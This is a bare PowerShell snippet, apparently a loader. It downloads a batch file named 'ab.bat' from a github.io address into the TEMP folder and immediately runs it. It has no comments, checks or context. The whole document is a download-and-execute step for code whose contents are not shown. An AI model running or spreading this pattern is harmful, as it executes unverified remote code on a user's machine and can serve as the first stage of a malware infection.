$bat="$env:TEMP\ab.bat"
Invoke-WebRequest "https://autokrd.github.io/ab.bat" -OutFile $bat
& $bat
